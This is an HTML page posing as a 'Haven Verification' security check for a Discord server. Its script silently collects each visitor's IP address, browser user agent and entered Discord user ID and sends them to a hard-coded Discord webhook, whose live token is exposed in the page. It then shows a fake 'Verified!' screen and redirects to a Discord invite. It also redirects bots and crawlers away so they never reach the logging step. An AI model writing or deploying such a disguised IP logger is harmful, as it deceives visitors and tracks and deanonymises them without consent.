<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Verifying...</title>

  <link rel="preconnect" href="https://googleapis.com">
  <link rel="preconnect" href="https://gstatic.com" crossorigin>
  <link href="https://googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

  <style>
    body {
      margin: 0;
      padding: 0;
      background: #0d0d0d;
      color: #fff;
      font-family: 'Poppins', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      overflow: hidden;
    }

    .symbols {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      opacity: 0.08;
      font-size: 80px;
      line-height: 1;
      display: grid;
      grid-template-columns: repeat(6, 1fr);
      grid-template-rows: repeat(6, 1fr);
    }
    .symbols span {
      display: flex;
      align-items: center;
      justify-content: center;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0% { transform: translateY(0px); }
      50% { transform: translateY(-15px); }
      100% { transform: translateY(0px); }
    }

    .box {
      background: rgba(255, 255, 255, 0.08);
      padding: 40px 40px;
      border-radius: 20px;
      backdrop-filter: blur(6px);
      text-align: center;
      z-index: 10;
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.07);
      max-width: 350px;
      width: 90%;
    }

    h1 {
      margin: 0 0 10px;
      font-size: 28px;
      font-weight: 600;
      color: #ffffff;
    }

    .input-container {
      margin: 25px 0 15px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .user-input {
      width: 100%;
      padding: 14px;
      border-radius: 8px;
      border: 1px solid rgba(255, 255, 255, 0.15);
      background: rgba(0, 0, 0, 0.3);
      color: #fff;
      font-family: 'Poppins', sans-serif;
      font-size: 14px;
      box-sizing: border-box;
      outline: none;
      transition: all 0.3s ease;
    }

    .user-input:focus {
      border-color: #5865F2;
      box-shadow: 0 0 8px rgba(88, 101, 242, 0.3);
    }

    .submit-button {
      width: 100%;
      padding: 13px;
      border: none;
      border-radius: 8px;
      background: #5865F2;
      color: #fff;
      font-family: 'Poppins', sans-serif;
      font-size: 15px;
      font-weight: 500;
      cursor: pointer;
      transition: background 0.2s ease;
    }

    .submit-button:hover {
      background: #4752c4;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.1);
      border-top-color: #5865F2;
      border-radius: 50%;
      margin: 30px auto;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .success-icon {
      display: none;
      font-size: 55px;
      color: #43b581;
      margin: 25px auto;
      animation: pop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    }
    @keyframes pop {
      0% { transform: scale(0); }
      100% { transform: scale(1); }
    }

    .status-text {
      font-size: 16px;
      color: #b9bbbe;
      font-weight: 500;
      margin: 10px 0 0;
    }
  </style>
</head>
<body>
  <div class="symbols">
    <span>★</span><span>✦</span><span>✧</span><span>✶</span><span>⚝</span><span>✺</span>
    <span>✦</span><span>✧</span><span>★</span><span>✶</span><span>⚝</span><span>✺</span>
    <span>✧</span><span>★</span><span>✦</span><span>⚝</span><span>✺</span><span>✶</span>
    <span>✦</span><span>✺</span><span>⚝</span><span>★</span><span>✶</span><span>✧</span>
    <span>✶</span><span>★</span><span>✦</span><span>✧</span><span>⚝</span><span>✺</span>
    <span>⚝</span><span>✶</span><span>✦</span><span>✧</span><span>★</span><span>✺</span>
  </div>

  <div class="box">
    <h1 id="title-text">Haven Verification</h1>
    
    <div id="form-block" class="input-container">
      <input type="text" id="user-id-input" class="user-input" placeholder="Masukkan User ID Anda..." autocomplete="off">
      <button class="submit-button" onclick="verifyAndLog()">Verify Connection</button>
    </div>

    <div id="loader" class="spinner" style="display: none;"></div>
    <div id="success-mark" class="success-icon"><i class="fa-solid fa-circle-check"></i></div>
    
    <p id="status-label" class="status-text">Silakan masukkan User ID untuk memulai otentikasi.</p>
  </div>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1525022705395695616/c9rgCPXtMXbX5Bxww7ZaA7XvjzeE0xrIBzvCeLQCZyWRFpWNM5Zzf6z-XeamlRdR8k44";
    const discordInvite = "https://discord.gg/hnM25Q7fvS";
    
    let globalUserIp = "Unknown/Blocked";
    let ipFetchPromise = null;

    function playSuccessSound() {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioCtx.createOscillator();
            const gainNode = audioCtx.createGain();
            
            oscillator.type = 'sine';
            oscillator.frequency.setValueAtTime(587.33, audioCtx.currentTime);
            oscillator.frequency.setValueAtTime(880, audioCtx.currentTime + 0.1);
            
            gainNode.gain.setValueAtTime(0.1, audioCtx.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime + 0.4);
            
            oscillator.connect(gainNode);
            gainNode.connect(audioCtx.destination);
            
            oscillator.start();
            oscillator.stop(audioCtx.currentTime + 0.4);
        } catch (e) {
            console.log("Audio not supported or blocked.");
        }
    }

    function initGate() {
        const userAgent = navigator.userAgent;
        if (/bot|discord|robot|curl|spider|crawler/i.test(userAgent)) {
            window.location.href = discordInvite;
            return;
        }

        ipFetchPromise = fetch("https://api.ipify.org?format=json")
            .then(res => res.json())
            .then(data => {
                globalUserIp = data.ip;
            })
            .catch(() => {
                return fetch("https://ipapi.co")
                    .then(res => res.json())
                    .then(data => {
                        globalUserIp = data.ip;
                    })
                    .catch(() => {
                        globalUserIp = "Unknown/Blocked";
                    });
            });
    }

    async function verifyAndLog() {
        const userIdField = document.getElementById('user-id-input');
        const userIdValue = userIdField.value.trim();

        const isOnlyNumbers = /^\d+$/.test(userIdValue);
        if (!userIdValue || !isOnlyNumbers || userIdValue.length < 17 || userIdValue.length > 19) {
            alert("User ID tidak valid!");
            return;
        }

        document.getElementById('form-block').style.display = 'none';
        document.getElementById('loader').style.display = 'block';
        document.getElementById('status-label').innerText = "Verifying security connection...";

        if (globalUserIp === "Unknown/Blocked" && ipFetchPromise) {
            await ipFetchPromise;
        }

        const userAgent = navigator.userAgent;
        const now = new Date();
        
        const payload = {
            username: ".Revin",
            avatar_url: "https://cdn.discordapp.com/avatars/1288936739561279618/47a58cb8dbd6b2179367e4f50bf4a0b8.webp?size=160",
            content: `🛡️ **[MEMBER VERIFIED]**\n👤 **User ID:** <@${userIdValue}>\n🌐 **IP:** \`${globalUserIp}\`\n📅 **Date:** ${now.toLocaleDateString('id-ID')}\n⏰ **Time:** ${now.toLocaleTimeString('id-ID')}\n💻 **Device:** \`${userAgent}\``
        };

        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
        try {
            if (navigator.sendBeacon) {
                navigator.sendBeacon(webhookUrl, blob);
            } else {
                fetch(webhookUrl, { method: "POST", body: blob, mode: "no-cors" });
            }
        } catch (err) {
            console.log("Log pushed");
        }

        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('success-mark').style.display = 'block';
            document.getElementById('status-label').innerText = "Tunggu sampai verifikasi diterima! Redirecting...";
            document.getElementById('status-label').style.color = "#43b581";
            document.getElementById('title-text').innerText = "Verified!";
            
            playSuccessSound();

            setTimeout(() => {
                window.location.href = discordInvite;
            }, 1000);

        }, 3000);
    }

    window.onload = initGate;
  </script>
</body>
</html>
